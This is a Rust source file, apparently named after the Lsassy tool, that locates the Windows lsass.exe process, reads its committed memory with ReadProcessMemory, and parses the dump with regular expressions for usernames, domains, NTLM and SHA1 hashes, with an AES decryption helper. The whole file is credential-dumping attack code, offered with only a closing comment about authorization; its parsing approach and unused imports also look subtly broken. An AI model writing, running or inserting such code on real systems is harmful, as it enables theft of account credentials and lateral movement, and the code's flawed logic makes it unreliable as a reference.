use winapi::um::{winnt, processthreadsapi, handleapi, tlhelp32, memoryapi, securitybaseapi};
use winapi::shared::{minwindef, winerror};
use ntapi::ntlsa::{LsaEnumerateLogonSessions, LsaGetLogonSessionData, SECURITY_LOGON_SESSION_DATA};
use widestring::U16CString;
use anyhow::{Result, anyhow};
use base64::{encode, decode};
use aes::Aes128;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use md5::{Md5, Digest};
use regex::Regex;
use std::ptr;
use std::mem;

type Aes128Cbc = Cbc<Aes128, Pkcs7>;

pub struct Lsassy;

impl Lsassy {
    pub fn dump_lsass() -> Result<Vec<u8>> {
        unsafe {
            let lsass_pid = Self::get_process_id("lsass.exe")?;
            let h_process = processthreadsapi::OpenProcess(
                winnt::PROCESS_VM_READ | winnt::PROCESS_QUERY_INFORMATION,
                minwindef::FALSE,
                lsass_pid,
            );

            if h_process == handleapi::INVALID_HANDLE_VALUE {
                return Err(anyhow!("Failed to open LSASS process"));
            }

            let mut buffer = Vec::new();
            let mut address: usize = 0;
            let mut bytes_read: usize;

            loop {
                let mut mem_basic_info: winnt::MEMORY_BASIC_INFORMATION = mem::zeroed();
                let query_result = memoryapi::VirtualQueryEx(
                    h_process,
                    address as *const _,
                    &mut mem_basic_info,
                    mem::size_of::<winnt::MEMORY_BASIC_INFORMATION>(),
                );

                if query_result == 0 {
                    break;
                }

                if mem_basic_info.State == winnt::MEM_COMMIT
                    && (mem_basic_info.Protect & winnt::PAGE_READWRITE) != 0
                {
                    let mut chunk = vec![0u8; mem_basic_info.RegionSize];
                    let read_result = memoryapi::ReadProcessMemory(
                        h_process,
                        mem_basic_info.BaseAddress,
                        chunk.as_mut_ptr() as *mut _,
                        mem_basic_info.RegionSize,
                        &mut bytes_read,
                    );

                    if read_result != 0 {
                        buffer.extend_from_slice(&chunk[..bytes_read]);
                    }
                }

                address += mem_basic_info.RegionSize;
            }

            handleapi::CloseHandle(h_process);
            Ok(buffer)
        }
    }

    pub fn parse_lsass_dump(dump: &[u8]) -> Result<Vec<Credential>> {
        let mut credentials = Vec::new();
        let regex_patterns = [
            Regex::new(r"(?i)username\s*:\s*(\S+)")?,
            Regex::new(r"(?i)domain\s*:\s*(\S+)")?,
            Regex::new(r"(?i)NTLM\s*:\s*([0-9a-fA-F]{32})")?,
            Regex::new(r"(?i)SHA1\s*:\s*([0-9a-fA-F]{40})")?,
        ];

        let dump_str = String::from_utf8_lossy(dump);
        let mut current_cred = Credential::default();

        for line in dump_str.lines() {
            for (i, pattern) in regex_patterns.iter().enumerate() {
                if let Some(captures) = pattern.captures(line) {
                    match i {
                        0 => current_cred.username = captures[1].to_string(),
                        1 => current_cred.domain = captures[1].to_string(),
                        2 => current_cred.nt_hash = Some(captures[1].to_string()),
                        3 => current_cred.sha1_hash = Some(captures[1].to_string()),
                        _ => {}
                    }
                }
            }

            if current_cred.is_valid() {
                credentials.push(current_cred.clone());
                current_cred = Credential::default();
            }
        }

        Ok(credentials)
    }

    pub fn decrypt_password(encrypted: &[u8], key: &[u8]) -> Result<String> {
        let cipher = Aes128Cbc::new_from_slices(key, &[0u8; 16])?;
        let decrypted = cipher.decrypt_vec(encrypted)?;
        String::from_utf8(decrypted).map_err(|e| anyhow!(e))
    }

    fn get_process_id(process_name: &str) -> Result<u32> {
        unsafe {
            let h_snapshot = tlhelp32::CreateToolhelp32Snapshot(tlhelp32::TH32CS_SNAPPROCESS, 0);
            if h_snapshot == handleapi::INVALID_HANDLE_VALUE {
                return Err(anyhow!("Failed to create snapshot"));
            }

            let mut pe = tlhelp32::PROCESSENTRY32W::default();
            pe.dwSize = std::mem::size_of::<tlhelp32::PROCESSENTRY32W>() as u32;

            if tlhelp32::Process32FirstW(h_snapshot, &mut pe) == minwindef::FALSE {
                handleapi::CloseHandle(h_snapshot);
                return Err(anyhow!("Failed to get first process"));
            }

            loop {
                let current_name = U16CString::from_ptr_str(pe.szExeFile.as_ptr());
                if current_name.to_string_lossy().to_lowercase() == process_name.to_lowercase() {
                    handleapi::CloseHandle(h_snapshot);
                    return Ok(pe.th32ProcessID);
                }

                if tlhelp32::Process32NextW(h_snapshot, &mut pe) == minwindef::FALSE {
                    break;
                }
            }

            handleapi::CloseHandle(h_snapshot);
            Err(anyhow!("Process not found"))
        }
    }
}

#[derive(Debug, Clone, Default)]
pub struct Credential {
    pub username: String,
    pub domain: String,
    pub password: Option<String>,
    pub nt_hash: Option<String>,
    pub sha1_hash: Option<String>,
}

impl Credential {
    fn is_valid(&self) -> bool {
        !self.username.is_empty() && !self.domain.is_empty() && (self.nt_hash.is_some() || self.sha1_hash.is_some())
    }
}

// Note: This module contains sensitive operations that should only be used
// with proper authorization and in compliance with applicable laws and regulations.